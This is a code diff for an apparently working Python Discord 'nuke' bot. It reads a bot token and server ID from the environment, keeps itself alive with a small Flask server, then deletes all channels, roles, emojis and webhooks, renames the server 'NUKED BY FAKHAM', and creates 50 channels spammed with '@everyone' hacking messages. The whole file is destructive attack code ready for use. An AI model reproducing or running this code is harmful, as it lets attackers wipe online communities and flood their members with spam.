@@ -1,74 +1,79 @@
+import os
 import requests
 import time
+import threading
+from flask import Flask
 
-def nuke_tool():
-    token = input("Enter your BOT token: ").strip()
-    guild_id = input("Enter the server (guild) ID: ").strip()
-    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
-    base_url = "https://discord.com/api/v9"
+app = Flask(__name__)
 
-    def send_request(method, url, json=None):
-        while True:
-            r = method(url, headers=headers, json=json)
-            if r.status_code == 429:
-                retry_after = r.json().get("retry_after", 1)
-                time.sleep(retry_after)
-            else:
-                return r
+@app.route('/')
+def home():
+    return "Bot is running!"
 
-    def create_channels():
-        count = int(input("Count: "))
-        name = input("Name: ")
-        for _ in range(count):
-            send_request(requests.post, f"{base_url}/guilds/{guild_id}/channels", {"name": name, "type": 0})
+def run_web_server():
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
 
+TOKEN = os.getenv("BOT_TOKEN")
+GUILD_ID = os.getenv("GUILD_ID")
+BASE_URL = "https://discord.com/api/v9"
+HEADERS = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}
+
+def send_request(method, url, json=None):
+    while True:
+        r = method(url, headers=HEADERS, json=json)
+        if r.status_code == 429:
+            retry_after = r.json().get("retry_after", 1)
+            time.sleep(retry_after)
+        else:
+            return r
+
+def nuke_operations():
     def delete_channels():
-        r = requests.get(f"{base_url}/guilds/{guild_id}/channels", headers=headers)
-        for ch in r.json():
-            send_request(requests.delete, f"{base_url}/channels/{ch['id']}")
+        r = requests.get(f"{BASE_URL}/guilds/{GUILD_ID}/channels", headers=HEADERS)
+        if r.status_code == 200:
+            for ch in r.json():
+                send_request(requests.delete, f"{BASE_URL}/channels/{ch['id']}")
 
-    def change_server_name():
-        new_name = input("New name: ")
-        send_request(requests.patch, f"{base_url}/guilds/{guild_id}", {"name": new_name})
+    def delete_roles():
+        r = requests.get(f"{BASE_URL}/guilds/{GUILD_ID}/roles", headers=HEADERS)
+        if r.status_code == 200:
+            for role in r.json():
+                if role['name'] != "@everyone" and not role['managed']:
+                    send_request(requests.delete, f"{BASE_URL}/guilds/{GUILD_ID}/roles/{role['id']}")
 
     def delete_emojis():
-        r = requests.get(f"{base_url}/guilds/{guild_id}/emojis", headers=headers)
-        for e in r.json():
-            send_request(requests.delete, f"{base_url}/guilds/{guild_id}/emojis/{e['id']}")
+        r = requests.get(f"{BASE_URL}/guilds/{GUILD_ID}/emojis", headers=HEADERS)
+        if r.status_code == 200:
+            for e in r.json():
+                send_request(requests.delete, f"{BASE_URL}/guilds/{GUILD_ID}/emojis/{e['id']}")
 
     def delete_webhooks():
-        r = requests.get(f"{base_url}/guilds/{guild_id}/webhooks", headers=headers)
-        for w in r.json():
-            send_request(requests.delete, f"{base_url}/webhooks/{w['id']}")
+        r = requests.get(f"{BASE_URL}/guilds/{GUILD_ID}/webhooks", headers=HEADERS)
+        if r.status_code == 200:
+            for w in r.json():
+                send_request(requests.delete, f"{BASE_URL}/webhooks/{w['id']}")
 
-    def spam_all_channels():
-        msg = input("Message: ")
-        r = requests.get(f"{base_url}/guilds/{guild_id}/channels", headers=headers)
-        for ch in r.json():
-            if ch.get('type') == 0:
-                send_request(requests.post, f"{base_url}/channels/{ch['id']}/messages", {"content": msg})
-
-    def mass_create_and_spam():
-        count = int(input("Count: "))
-        name = input("Name: ")
-        msg = input("Message: ")
+    def mass_create_and_spam(count, name, msg):
         for i in range(count):
-            res = send_request(requests.post, f"{base_url}/guilds/{guild_id}/channels", {"name": f"{name}-{i}", "type": 0})
+            res = send_request(requests.post, f"{BASE_URL}/guilds/{GUILD_ID}/channels", {"name": f"{name}-{i}", "type": 0})
             if res.status_code == 201:
                 channel_id = res.json()['id']
-                send_request(requests.post, f"{base_url}/channels/{channel_id}/messages", {"content": msg})
+                for _ in range(3):
+                    send_request(requests.post, f"{BASE_URL}/channels/{channel_id}/messages", {"content": msg})
 
-    while True:
-        print("\n1-Create\n2-Delete\n3-Rename\n4-Emojis\n5-Webhooks\n6-Spam\n7-Mass Create & Spam\n0-Exit")
-        choice = input("Choice: ")
-        if choice == "1": create_channels()
-        elif choice == "2": delete_channels()
-        elif choice == "3": change_server_name()
-        elif choice == "4": delete_emojis()
-        elif choice == "5": delete_webhooks()
-        elif choice == "6": spam_all_channels()
-        elif choice == "7": mass_create_and_spam()
-        elif choice == "0": break
+    def change_name(new_name):
+        send_request(requests.patch, f"{BASE_URL}/guilds/{GUILD_ID}", {"name": new_name})
+
+    delete_channels()
+    delete_roles()
+    delete_emojis()
+    delete_webhooks()
+    change_name("NUKED BY FAKHAM")
+    mass_create_and_spam(50, "nuked", "@everyone تم التهكير من فخم")
 
 if __name__ == "__main__":
-    nuke_tool()
+    threading.Thread(target=run_web_server).start()
+    if TOKEN and GUILD_ID:
+        nuke_operations()
+        
